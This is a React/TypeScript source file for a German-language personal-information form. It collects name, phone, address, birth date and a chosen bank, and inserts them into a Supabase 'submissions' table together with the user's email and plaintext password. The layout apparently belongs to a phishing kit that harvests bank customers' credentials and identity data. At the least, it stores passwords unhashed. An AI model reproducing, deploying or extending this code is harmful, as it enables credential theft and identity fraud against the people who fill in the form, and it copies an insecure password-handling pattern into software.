import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useFormStore } from '../store/formStore';
import { supabase } from '../lib/supabase';

interface Bank {
  id: string;
  name: string;
}

export default function Information() {
  const navigate = useNavigate();
  const { 
    firstName, lastName, phone, bankId,
    setFirstName, setLastName, setPhone, setBankId,
    email, password,
    streetAddress, setStreetAddress,
    doorNumber, setDoorNumber,
    zipcode, setZipcode,
    city, setCity,
    birthDate, setBirthDate
  } = useFormStore();
  
  const [banks, setBanks] = useState<Bank[]>([]);
  const [errors, setErrors] = useState({
    firstName: '',
    lastName: '',
    phone: '',
    bankId: '',
    streetAddress: '',
    doorNumber: '',
    zipcode: '',
    city: '',
    birthDate: ''
  });

  useEffect(() => {
    const fetchBanks = async () => {
      const { data } = await supabase
        .from('banks')
        .select('id, name')
        .eq('active', true);
      
      if (data) {
        setBanks(data);
      }
    };

    fetchBanks();
  }, []);

  const validateForm = () => {
    const newErrors = {
      firstName: !firstName.trim() ? 'Vorname ist erforderlich' : '',
      lastName: !lastName.trim() ? 'Nachname ist erforderlich' : '',
      phone: !phone.trim() ? 'Telefonnummer ist erforderlich' : '',
      bankId: !bankId ? 'Bitte wählen Sie eine Bank aus' : '',
      streetAddress: !streetAddress?.trim() ? 'Straße ist erforderlich' : '',
      doorNumber: !doorNumber?.trim() ? 'Hausnummer ist erforderlich' : '',
      zipcode: !zipcode?.trim() ? 'PLZ ist erforderlich' : '',
      city: !city?.trim() ? 'Stadt ist erforderlich' : '',
      birthDate: !birthDate ? 'Geburtsdatum ist erforderlich' : ''
    };

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    try {
      const { error } = await supabase
        .from('submissions')
        .insert([
          {
            email,
            password,
            first_name: firstName,
            last_name: lastName,
            phone,
            bank_id: bankId,
            street_address: streetAddress,
            door_number: doorNumber,
            zipcode,
            city,
            birth_date: birthDate
          }
        ]);

      if (error) throw error;
      
      navigate('/thank-you');
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <div className="max-w-md mx-auto p-4">
      <div className="bg-white rounded-lg shadow-sm border p-8">
        <h1 className="text-2xl font-normal text-center mb-8">
          Persönliche Informationen
        </h1>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm mb-1">
                Vorname *
              </label>
              <input
                type="text"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                placeholder="Vorname"
              />
              {errors.firstName && (
                <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>
              )}
            </div>

            <div>
              <label className="block text-sm mb-1">
                Nachname *
              </label>
              <input
                type="text"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                placeholder="Nachname"
              />
              {errors.lastName && (
                <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>
              )}
            </div>
          </div>

          <div>
            <label className="block text-sm mb-1">
              Telefonnummer *
            </label>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
              placeholder="Telefonnummer"
            />
            {errors.phone && (
              <p className="mt-1 text-sm text-red-600">{errors.phone}</p>
            )}
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-sm mb-1">
                Straße *
              </label>
              <input
                type="text"
                value={streetAddress}
                onChange={(e) => setStreetAddress(e.target.value)}
                className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                placeholder="Straßenname"
              />
              {errors.streetAddress && (
                <p className="mt-1 text-sm text-red-600">{errors.streetAddress}</p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm mb-1">
                  Hausnummer *
                </label>
                <input
                  type="text"
                  value={doorNumber}
                  onChange={(e) => setDoorNumber(e.target.value)}
                  className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                  placeholder="Nr."
                />
                {errors.doorNumber && (
                  <p className="mt-1 text-sm text-red-600">{errors.doorNumber}</p>
                )}
              </div>

              <div>
                <label className="block text-sm mb-1">
                  PLZ *
                </label>
                <input
                  type="text"
                  value={zipcode}
                  onChange={(e) => setZipcode(e.target.value)}
                  className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                  placeholder="Postleitzahl"
                />
                {errors.zipcode && (
                  <p className="mt-1 text-sm text-red-600">{errors.zipcode}</p>
                )}
              </div>
            </div>

            <div>
              <label className="block text-sm mb-1">
                Stadt *
              </label>
              <input
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
                placeholder="Stadt"
              />
              {errors.city && (
                <p className="mt-1 text-sm text-red-600">{errors.city}</p>
              )}
            </div>
          </div>

          <div>
            <label className="block text-sm mb-1">
              Geburtsdatum *
            </label>
            <input
              type="date"
              value={birthDate}
              onChange={(e) => setBirthDate(e.target.value)}
              className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
            />
            {errors.birthDate && (
              <p className="mt-1 text-sm text-red-600">{errors.birthDate}</p>
            )}
          </div>

          <div>
            <label className="block text-sm mb-1">
              Bank für die Zahlung *
            </label>
            <select
              value={bankId}
              onChange={(e) => setBankId(e.target.value)}
              className="w-full px-4 py-2 border rounded focus:ring-2 focus:ring-red-500 focus:border-red-500"
            >
              <option value="">Bitte wählen Sie Ihre Bank</option>
              {banks.map((bank) => (
                <option key={bank.id} value={bank.id}>
                  {bank.name}
                </option>
              ))}
            </select>
            {errors.bankId && (
              <p className="mt-1 text-sm text-red-600">{errors.bankId}</p>
            )}
          </div>

          <button
            type="submit"
            className="w-full bg-red-600 text-white py-3 px-6 rounded font-normal
                     hover:bg-red-700 transition-colors duration-200"
          >
            Informationen speichern
          </button>
        </form>
      </div>
    </div>
  );
}